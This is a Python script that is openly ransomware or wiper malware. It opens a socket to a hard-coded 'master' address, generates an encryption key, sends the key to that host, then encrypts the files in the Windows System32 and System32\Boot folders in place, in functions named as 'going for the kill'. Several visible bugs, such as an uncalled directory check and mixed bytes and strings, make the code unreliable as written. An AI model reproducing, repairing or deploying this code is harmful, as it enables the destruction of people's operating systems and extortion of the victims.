import os
from cryptography.fernet import Fernet
import socket
import multiprocessing as mp


MASTER = "192.168.56.1"
PORT = 6969
ADDR = (MASTER, PORT)
FORMAT = "utf-8"
HEADER = 64
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


key = Fernet.generate_key()
key_string = str(key)
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

#sending key to master
def send(msg):
    message = msg
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)
    
    
#finally...going for the kill
def first_injection():
    files = []
    def kill_system32():
        try:
            os.chdir("C:\Windows\System32")
        except LookupError as e:
            os.chdir("D:\Windows\System32")
        path = r"C:\Windows\System32"
        for _ in os.listdir(path):
            if os.path.isdir:
                continue
            files.append(_)
            
    kill_system32()
    for _ in files:
        with open(_, "rb") as thefile:
            contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(_, "wb") as thefile:
                thefile.write(contents_encrypted)
                
def second_injection():
    try:
        os.chdir("C:\Windows\System32")
    except LookupError as e:
        os.chdir("D:\Windows\System32")
    boot_files = []
    #first add boot files into a list
    def add_bootfiles_in_kill_queue():
        
        boot_path = r"C:\Windows\System32\Boot"
        for _ in os.listdir(boot_path):
            if os.path.isdir:
                continue
            boot_files.append(_)
            
    add_bootfiles_in_kill_queue()
    
    #secondly, encrypt bootfiles
    for _ in boot_files:
        with open(_, "rb") as afile:
            bcontents = afile.read()
            bcontents_encrypted = Fernet(key).encrypt(bcontents)
            with open(_, "wb") as afile:
                afile.write(bcontents_encrypted)
                
                
                
if __name__ == '__main__':
    send(key_string + "#####THAT IS THE KEY")
    send(key + "######THAT IS THE KEY")
    i = mp.Process(target=send, args=key_string)
    i_0 = mp.Process(target=send, args=key)
    i_1 = mp.Process(target=first_injection)
    i_2 = mp.Process(target=second_injection)
    i_1.start()
    i_2.start()
    i_1.join()
    i_2.join()
    